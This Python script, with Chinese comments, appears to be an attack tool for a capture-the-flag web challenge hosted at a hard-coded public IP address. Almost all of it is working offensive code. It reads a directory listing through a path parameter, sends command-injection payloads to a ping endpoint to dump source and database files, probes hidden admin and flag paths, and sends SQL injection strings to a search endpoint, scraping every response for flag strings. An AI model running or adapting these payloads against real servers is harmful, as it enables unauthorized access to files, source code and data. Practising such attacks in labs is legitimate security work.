import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*60)
print("检查上传目录中的文件")
print("="*60)

# 获取上传目录列表
r = session.get(f"{TARGET}/backup", params={"path": "F:\\small peoject\\python-lab\\uploads"}, timeout=10)
if r.status_code == 200:
    body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    if body:
        files = body.group(1).strip().split('\n')
        print(f"文件列表: {files}")
        
        # 检查每个文件的内容
        for filename in files:
            if filename and filename != '.gitkeep':
                try:
                    r2 = session.get(f"{TARGET}/uploads/{filename}", timeout=10)
                    if r2.status_code == 200:
                        content = r2.text[:200]
                        print(f"\n>>> {filename}")
                        print(f"内容: {content}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                            exit(0)
                except:
                    pass

print("\n" + "="*60)
print("测试Ping - 尝试读取源码")
print("="*60)

ping_payloads = [
    # 尝试读取源码
    "127.0.0.1 & type F:\\small peoject\\python-lab\\app.py",
    "127.0.0.1 && type F:\\small peoject\\python-lab\\app.py",
    "127.0.0.1 | type F:\\small peoject\\python-lab\\app.py",
    "127.0.0.1; type F:\\small peoject\\python-lab\\app.py",
    # 尝试其他路径
    "127.0.0.1 & type F:\\small peoject\\python-lab\\main.py",
    "127.0.0.1 & type F:\\small peoject\\python-lab\\server.py",
    # 尝试读取数据库
    "127.0.0.1 & type F:\\small peoject\\python-lab\\database.db",
    # 尝试dir命令
    "127.0.0.1 & dir F:\\small peoject\\python-lab",
]

for payload in ping_payloads:
    try:
        r = session.get(f"{TARGET}/ping", params={"host": payload}, timeout=10)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if len(content) > 50 and "Blocked" not in content and "ping" not in content.lower()[:100]:
                    print(f"\n>>> {payload}")
                    print(f"响应: {content[:600]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n" + "="*60)
print("测试源码页面")
print("="*60)

source_paths = [
    "/upload-source",
    "/source",
    "/app.py",
    "/main.py",
    "/debug",
    "/admin",
    "/flag",
    "/secret",
]

for path in source_paths:
    try:
        r = session.get(f"{TARGET}{path}", timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"\n>>> {path}")
            print(f"状态码: {r.status_code}")
            print(f"内容: {r.text[:500]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

print("\n" + "="*60)
print("测试更多SQL注入")
print("="*60)

sql_payloads = [
    "' OR 1=1 LIMIT 1--",
    "' OR ''='",
    "1' ORDER BY 1--",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
    "admin",
    "'",
    "\"",
]

for payload in sql_payloads:
    try:
        r = session.get(f"{TARGET}/search", params={"q": payload}, timeout=10)
        if r.status_code == 200:
            # 检查是否有隐藏结果
            results = re.findall(r'<h2>(.*?)</h2>', r.text)
            if len(results) > 0:
                print(f"\n>>> {payload}")
                print(f"结果数: {len(results)}")
                for result in results[:5]:
                    print(f"  - {result}")
                
                flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
    except:
        pass

print("\n" + "="*60)
print("测试Cookie和隐藏字段")
print("="*60)

try:
    r = session.get(f"{TARGET}/", timeout=10)
    print(f"Cookies: {session.cookies.get_dict()}")
    
    # 检查隐藏字段
    hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']+)["\']', r.text)
    print(f"隐藏字段: {hidden_fields}")
    
    # 检查注释
    comments = re.findall(r'<!--(.*?)-->', r.text)
    print(f"注释: {comments}")
    
    for comment in comments:
        flag_match = re.search(r'flag\{[^}]+\}', comment, re.IGNORECASE)
        if flag_match:
            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
            exit(0)
except:
    pass

print("\n" + "="*60)
print("检查响应头")
print("="*60)

try:
    r = session.get(f"{TARGET}/", timeout=10)
    print(f"响应头:")
    for key, value in r.headers.items():
        print(f"  {key}: {value}")
        
        flag_match = re.search(r'flag\{[^}]+\}', value, re.IGNORECASE)
        if flag_match:
            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
            exit(0)
except:
    pass

print("\n" + "="*60)
print("测试完成")
print("="*60)